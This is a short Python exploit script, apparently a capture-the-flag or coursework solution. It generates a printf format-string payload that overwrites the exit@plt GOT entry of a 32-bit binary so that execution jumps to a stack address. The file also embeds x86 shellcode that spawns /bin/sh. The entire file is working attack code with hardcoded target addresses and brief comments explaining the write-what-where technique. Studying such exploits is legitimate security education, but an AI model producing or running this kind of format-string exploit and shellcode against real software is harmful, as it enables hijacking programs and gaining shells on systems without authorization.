#!/usr/bin/env python3
import struct
from typing import NamedTuple

# this file prints a printf format string that allows you to write a arbitrary int to an arbitrary address

# which "argument" represent the start of the string


# this is a shell code :D
PAYLOAD = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
STRING_MAX_SIZE   = 100
STRING_START_ADDR = 0xffffdd98


#                                   7 bytes per %XX$hhn
#                                 / 4 bytes per address
#                                 |       We have 4 writes
# Maximum printed characters      |      /    padding \0 at the end
#                          |     / \     |   /    / Lets round this up :D
MAX_PRINT_PAYLOAD_SIZE = 255 + (7 + 4) * 4 + 4 + 37 


ARG_START = 10
ADDR      = 0x080497e0 # exit@plt.got
VALUE     = 0xffffdfbf

AddrVal = NamedTuple("AddrVal", [("addr", int), ("value", int)])

packed_data = list(
    map(
        lambda b: AddrVal(addr=b[0] + ADDR, value=b[1]),
        enumerate(iter(struct.pack("<I", VALUE))),
    )
)


packed_data = sorted(packed_data, key=lambda v: v.value)

# what do we want to do ?
# for every byte
# we need write the address of the byte itself and have written <value> chars

# we did sort the data by the value (since we can only increase the value written, not decrease it)

diff = []
tot = 0
for v in packed_data:
    val = v.value - tot
    diff.append(AddrVal(addr=v.addr, value=val))
    tot = v.value


out = bytearray()

# we now have a list of <addr>,<bytes to print> for the format string
# the only issue we have is that we need to put the address at the end of the string
# but this means that for character we add the the script, we actually may shift the
# "argument" number

# here when we add stuff, we increase the "argument numer", so we can just put placeholder and voila

for data in diff:
    if data.value > 5:
        out.extend(f"%{data.value}c".encode())
    elif data.value > 0:
        for _ in range(data.value):
            out.extend(b".")
    out.extend(b"%XX$hhn")

out.extend(b"\0")
while len(out) % 4 != 0:
    out.extend(b"\0")

for data in diff:
    offset = len(out) // 4
    out.extend(struct.pack("<I", data.addr))
    out = out.replace(b"XX", f"{offset + ARG_START}".encode(), 1)

raw = repr(bytes(out))[2:-1]

print(f"python -c 'print(\"{raw}\")'")
